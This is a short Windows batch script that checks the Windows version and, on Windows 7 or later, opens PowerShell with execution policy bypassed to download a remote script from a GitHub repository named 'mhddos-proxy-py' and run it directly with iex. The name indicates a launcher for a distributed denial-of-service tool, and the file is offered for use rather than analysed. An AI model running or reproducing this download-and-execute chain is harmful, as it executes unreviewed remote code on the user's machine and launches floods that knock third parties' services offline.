@echo off
setlocal
for /f "tokens=2 delims=[]" %%i in ('ver') do set VERSION=%%i
for /f "tokens=2-3 delims=. " %%i in ("%VERSION%") do set VERSION=%%i.%%j
if "%VERSION%" GEQ "6.1" goto w7
endlocal
if "%VERSION%" == "5.00" set "w=Windows 2000"
if "%VERSION%" == "5.0" set "w=Windows 2000"
if "%VERSION%" == "5.1" set "w=Windows XP"
if "%VERSION%" == "5.2" set "w=Windows Server 2003"
if "%VERSION%" == "6.0" set "w=Windows Vista"
echo Your %w% is not supported
pause
goto end

:w7
start "mhddos" powershell -noexit -executionpolicy bypass -command "if ($PSVersionTable.PSVersion.Major -ge 3) {[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; cls; (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/mhddos-proxy-py/main/mhddos.ps1') | iex; exit} else {Write-Host "Your Windows is obsolete, please read this"; Start-Sleep -s 5; cls; Start-Process "https://github.com/wvzxn/mhddos-proxy-py" ; exit}"
:end
exit